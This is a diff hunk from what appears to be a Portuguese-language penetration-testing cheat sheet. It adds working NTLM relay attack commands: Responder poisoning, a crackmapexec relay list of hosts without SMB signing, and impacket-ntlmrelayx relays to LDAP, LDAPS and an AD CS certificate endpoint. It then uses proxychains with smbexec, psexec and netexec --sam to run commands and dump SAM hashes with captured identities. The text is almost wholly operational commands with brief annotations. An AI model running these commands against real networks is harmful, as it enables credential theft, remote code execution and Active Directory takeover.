@@ -3006,10 +3006,14 @@ Gerar arquivo Criptografado com tipo de imagem para o pentest
     sudo nano /etc/responder/Responder.conf TROCAR SMB E HTTP para OFF
     crackmapexec smb 192.168.2.32/38 --gen-relay-list relay.txt AQUI NA LISTA CONTEM OS SERVERS COM SIGNIN FALSE
     TERMINAL 1 impacket-ntlmrelayx -tf relay.txt -smb2support -of netntlm -socks -ip IP-ATACANTE && echo AQUI RODA O COMANDO socks PARA LISTAR SESSOES ATIVAS - OU
-	impacket-ntlmrelayx -t ldap://<DOMAIN_CONTROLLER_IP> --delegate-access -smb2support && echo PODE USAR OUTROS PROTOCOLOS COMO LDAP - OU
-	impacket-ntlmrelayx -t ldaps://<DOMAIN_CONTROLLER_IP> --delegate-access -smb2support && echo PODE USAR OUTROS PROTOCOLOS COMO LDAP
+	TERMINAL 1 impacket-ntlmrelayx -t ldap://<DOMAIN_CONTROLLER_IP> --delegate-access -smb2support && echo PODE USAR OUTROS PROTOCOLOS COMO LDAP - OU
+	TERMINAL 1 impacket-ntlmrelayx -t ldaps://<DOMAIN_CONTROLLER_IP> --delegate-access -smb2support && echo NESSE CASO COM S de SECURE - OU
+	TERMINAL 1 impacket-ntlmrelayx -t http://<AD_CS_SERVER_IP>/certsrv/certfnsh.asp -smb2support && echo PASSANDO O CERTIFICADO DIRETO - OU
+	impacket-ntlmrelayx -t ldaps://172.17.1.4 -socks -smb2support && echo SEM O DELEGATE
     TERMINAL 2 sudo responder -I eth2
     TERMINAL 3 proxychains impacket-smbexec -no-pass 'PRAIAS'/'LENITA'@'192.168.2.37' PRAIAS LENITA E O IP SAO IMPUTS CAPITURADOS DO RESPONDER E NTLMRELAY
+	TERMINAL 3 proxychains netexec smb <TARGET_IP> -u 'CapturedUser' -p 'IgnoredPassword' --sam
+	TERMINAL 3 proxychains impacket-psexec -no-pass 'DOMAIN/CapturedUser'@<TARGET_IP>
 
 `Silver Ticket` PRECISA DO NT HASH do Serviço, DOMAIN SID, SPN
 
